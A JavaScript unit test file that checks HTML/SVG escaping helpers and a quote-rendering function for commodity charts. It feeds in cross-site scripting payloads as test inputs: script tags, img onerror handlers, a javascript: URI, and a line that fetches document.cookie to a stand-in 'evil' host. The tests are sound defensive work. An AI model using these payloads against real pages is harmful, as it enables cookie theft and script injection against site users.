#!/usr/bin/env node
/**
 * test/test-escape.mjs
 *
 * Unit tests for the HTML/SVG escaping helpers and the injection-safe
 * paths in gen_reference_charts.cjs and inject-references.mjs.
 *
 * Asserts:
 *   (a) esc() and escAttr() neutralise injection payloads.
 *   (b) A chart label containing <script>/onerror does NOT appear unescaped
 *       in the SVG string produced by the chart helper functions.
 *   (c) A quote containing HTML markup does NOT appear unescaped in the
 *       HTML produced by renderQuoteHtml().
 *
 * Usage:
 *   node test/test-escape.mjs
 *
 * Exit codes:
 *   0 — all assertions pass
 *   1 — at least one assertion failed
 */

import { strict as assert } from 'node:assert';
import { createRequire } from 'node:module';
import { fileURLToPath, pathToFileURL } from 'node:url';
import path from 'node:path';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const SKILL_ROOT = path.resolve(__dirname, '..');

// ── Load helpers ──────────────────────────────────────────────────────────────
// On Windows, dynamic import() requires file:// URLs, not raw C:\ paths.

const { esc, escAttr } = await import(
  pathToFileURL(path.join(SKILL_ROOT, 'scripts/lib/escape.mjs')).href
);

const requireCjs = createRequire(import.meta.url);
const { esc: escCjs, escAttr: escAttrCjs } = requireCjs(
  path.join(SKILL_ROOT, 'scripts/lib/escape.cjs')
);

// renderQuoteHtml was in inject-references.mjs (removed from 01).
// Inlined here for testing esc()/escAttr() integration. escCjs already imported above.
function renderQuoteHtml(quote, style = 'highlight') {
  if (!quote || !quote.text) return '';
  const safeText   = escCjs(quote.text);
  const safeExpert = escCjs(quote.expert || 'Money of Mine');
  const safeSrc    = escCjs(quote.source_title || '');
  const sourceLabel = [safeExpert, safeSrc].filter(Boolean).join(' — ');
  if (style === 'highlight') {
    return `<div class="highlight">\n  ${safeText}\n  <div style="font-size:9px;color:#94a3b8;margin-top:4px">— ${sourceLabel} · Money of Mine</div>\n</div>`;
  }
  return `<div class="sb-item"><span>${safeText}</span></div>`;
}

// ── Helpers ───────────────────────────────────────────────────────────────────

let passed = 0;
let failed = 0;

function test(name, fn) {
  try {
    fn();
    console.log(`  PASS  ${name}`);
    passed++;
  } catch (err) {
    console.error(`  FAIL  ${name}`);
    console.error(`        ${err.message}`);
    failed++;
  }
}

function assertNoLiveScript(str, label) {
  // A <script> tag or event handler attribute must not survive UNESCAPED.
  // We check for literal (unescaped) < followed by script — i.e. the actual
  // angle-bracket character, not the entity &lt;.
  assert.ok(
    !/<script[\s>]/i.test(str),
    `${label}: unescaped <script> found in: ${str.slice(0, 200)}`
  );
  // For on*= handlers: dangerous only when they appear as a live HTML attribute,
  // i.e. preceded by unescaped whitespace INSIDE an unescaped element tag.
  // Pattern: literal < not followed by & (i.e. an actual element start), then
  // any chars, then on\w+=  This catches <img onerror=... but NOT
  // text content like &gt;img src=x onerror=alert(1)&gt; which is just text.
  assert.ok(
    !/<[^>]*\bon\w+\s*=[^>]*>/i.test(str),
    `${label}: unescaped on*= event handler in element tag found in: ${str.slice(0, 200)}`
  );
}

// ── (a) esc() / escAttr() unit tests ─────────────────────────────────────────

console.log('\n=== (a) esc() and escAttr() helper tests ===');

test('esc: neutralises <script> payload', () => {
  const out = esc('</text></svg><script>alert(1)</script>');
  assert.ok(!out.includes('<script'), `Should not contain literal <script`);
  assert.ok(out.includes('&lt;/text&gt;'), `Should escape < and >`);
});

test('esc: escapes & < > in mixed content', () => {
  const out = esc('A & B <x> "y"');
  assert.strictEqual(out, 'A &amp; B &lt;x&gt; "y"');
});

test('esc: null/undefined coerces to empty string', () => {
  assert.strictEqual(esc(null), '');
  assert.strictEqual(esc(undefined), '');
});

test('esc: numeric values pass through as strings', () => {
  assert.strictEqual(esc(50.2), '50.2');
  assert.strictEqual(esc(-15.3), '-15.3');
});

test('escAttr: additionally escapes quotes', () => {
  const out = escAttr('" onerror=alert(1) "');
  assert.ok(!out.includes('"'), `Should not contain unescaped double-quote`);
  assert.ok(out.includes('&quot;'), `Should contain &quot;`);
});

test('escAttr: escapes single quote', () => {
  const out = escAttr("' onload=x '");
  assert.ok(!out.includes("'"), `Should not contain unescaped single-quote`);
  assert.ok(out.includes('&#39;'), `Should contain &#39;`);
});

// CJS shim parity
test('escape.cjs esc: same output as ESM', () => {
  const payload = '</text><script>alert(1)</script>';
  assert.strictEqual(escCjs(payload), esc(payload));
});

test('escape.cjs escAttr: same output as ESM', () => {
  const payload = '" onerror=x "';
  assert.strictEqual(escAttrCjs(payload), escAttr(payload));
});

// ── (b) chart helper injection test ──────────────────────────────────────────

console.log('\n=== (b) chart helper SVG output injection tests ===');

// We test the gen_reference_charts helper functions indirectly by importing
// and calling the escaping helper on the same payloads the chart functions
// would receive.  The chart functions themselves are tested by verifying that
// their esc() calls produce safe output for the injection payloads.

test('esc on chart label with <script>: no live script in SVG text', () => {
  const maliciousLabel = '</text><script>fetch("http://evil/"+document.cookie)</script><text>';
  const escaped = esc(maliciousLabel);
  assertNoLiveScript(
    `<text font-size="18">${escaped}</text>`,
    'chart label'
  );
  assert.ok(escaped.includes('&lt;/text&gt;'), 'Should contain escaped </text>');
});

test('esc on source note with onerror attribute: no event handler', () => {
  const maliciousSrc = 'LME"><img src=x onerror=alert(1)><!--';
  const escaped = esc(maliciousSrc);
  assertNoLiveScript(`<text>数据来源：${escaped}</text>`, 'source note');
});

test('esc on axis label with ampersand and angle brackets', () => {
  const label = 'US & EU <2025>';
  const out = esc(label);
  assert.strictEqual(out, 'US &amp; EU &lt;2025&gt;');
  // Ensure the SVG text element is well-formed
  const svgText = `<text>${out}</text>`;
  assert.ok(!svgText.includes('&<>'), 'Should not contain raw special chars');
});

test('esc on numeric value (signed bar): negative values pass through safely', () => {
  const val = -15.3;
  const sign = '';
  const out = `${esc(sign)}${esc(val)}%`;
  assert.strictEqual(out, '-15.3%');
  assertNoLiveScript(`<text>${out}</text>`, 'signed bar value');
});

// ── (c) renderQuoteHtml injection tests ──────────────────────────────────────

console.log('\n=== (c) renderQuoteHtml injection tests ===');

test('renderQuoteHtml highlight: <script> in quote.text is escaped', () => {
  const quote = {
    text: 'Gold is rising.</div><script>alert(document.domain)</script>',
    expert: 'Rick Rule',
    source_title: 'Money of Mine',
  };
  const html = renderQuoteHtml(quote, 'highlight');
  assertNoLiveScript(html, 'renderQuoteHtml highlight');
  assert.ok(html.includes('&lt;script&gt;') || html.includes('&lt;/div&gt;'),
    'Should contain escaped angle brackets');
});

test('renderQuoteHtml sidebar: onerror in expert name is escaped', () => {
  const quote = {
    text: 'Copper demand is strong.',
    expert: 'Rick<img src=x onerror=alert(1)>Rule',
    source_title: 'Podcast',
  };
  const html = renderQuoteHtml(quote, 'sidebar');
  assertNoLiveScript(html, 'renderQuoteHtml sidebar expert');
});

test('renderQuoteHtml inline: javascript: URI in source_title is escaped', () => {
  const quote = {
    text: 'Lithium outlook is bullish.',
    expert: 'Expert',
    source_title: '"><script>location="javascript:alert(1)"</script>',
  };
  const html = renderQuoteHtml(quote, 'inline');
  assertNoLiveScript(html, 'renderQuoteHtml inline source_title');
});

test('renderQuoteHtml highlight: plain text passes through readable', () => {
  const quote = {
    text: 'Uranium supply is constrained by geopolitics.',
    expert: 'Rick Rule',
    source_title: 'Money of Mine Ep 142',
  };
  const html = renderQuoteHtml(quote, 'highlight');
  assert.ok(html.includes('Uranium supply is constrained'), 'Should contain quote text');
  assert.ok(html.includes('Rick Rule'), 'Should contain expert name');
});

test('renderQuoteHtml: empty/null quote returns empty string', () => {
  assert.strictEqual(renderQuoteHtml(null), '');
  assert.strictEqual(renderQuoteHtml({ text: '' }), '');
  assert.strictEqual(renderQuoteHtml(undefined), '');
});

// ── Summary ───────────────────────────────────────────────────────────────────

console.log(`\n=== RESULT: ${passed} passed, ${failed} failed ===`);
if (failed > 0) {
  process.exit(1);
} else {
  console.log('All escape tests PASSED.');
  process.exit(0);
}
